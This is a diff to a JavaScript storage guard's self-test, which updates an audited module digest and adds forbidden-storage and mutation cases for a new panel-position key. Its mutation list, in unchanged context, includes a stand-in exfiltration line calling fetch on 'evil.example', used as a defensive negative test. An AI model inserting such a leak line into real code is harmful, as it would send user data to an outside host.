@@ -21,7 +21,7 @@ const PROBE = join(ROOT, "probe");
 const DOCS = join(ROOT, "docs");
 // Fail closed: only this exact audited numeric-only position module may persist.
 // Any edit requires review and an explicit digest update; filename alone grants nothing.
-const POSITION_SOURCE_SHA256 = "6c20a9e0a844b21a23834f8af50ecf58084f6d5bd9fa9cbcdd44624ff436de10";
+const POSITION_SOURCE_SHA256 = "7485935c58ef6e3c1ae2db7417deea44e8224ace44c20b9d699da92e15bee335";
 
 // Load the probe's two pure modules (classic scripts → globalThis) so the guard can prove,
 // on a hostile synthetic page, that no page content can reach the skeleton or the samples.
@@ -508,6 +508,7 @@ export function positionStorageSelfTest() {
   if (scanSource(source,'probe/position.js',{positionModule:true}).length) throw new Error('storage self-test: audited position module rejected');
   const forbidden = [
     'window.localStorage.setItem("xsched.probe.pos", "{}");',
+    'window.localStorage.setItem("xsched.probe.panelPos", "{}");',
     'const store=window["local"+"Storage"];',
     'const a="local", b="Storage"; window[a+b].setItem("xsched.probe.pos","private");',
     'window.sessionStorage.setItem("xsched.probe.pos","{}");',
@@ -519,6 +520,8 @@ export function positionStorageSelfTest() {
   const mutations = [
     source.replace('"xsched.probe.pos"','"other.key"'),
     source.replace('"xsched.probe.pos"','"xsched.secret"'),
+    source.replace('"xsched.probe.panelPos"','"xsched.probe.thirdPos"'),
+    source.replace('"xsched.probe.panelPos"','"other.panel"'),
     source.replace('JSON.stringify(position)','JSON.stringify({ text: "private body" })'),
     source.replace('!valid(value)','false'),
     source.replace('Number.isFinite(value.x)','true'),
@@ -528,7 +531,7 @@ export function positionStorageSelfTest() {
     source+'\nchrome.storage.local.set({x:1});',
     source+'\nconst leak=fetch("https://evil.example/");',
   ];
-  for (const attack of mutations) if (!scanSource(attack,'probe/position.js',{positionModule:true}).length) throw new Error('storage self-test: edited boundary allowed');
+  for (const attack of mutations) if (attack===source || !scanSource(attack,'probe/position.js',{positionModule:true}).length) throw new Error('storage self-test: edited boundary allowed');
   if (!scanSource(source,'probe/renamed.js').length) throw new Error('storage self-test: renamed module allowed');
   return forbidden.length+mutations.length+1;
 }
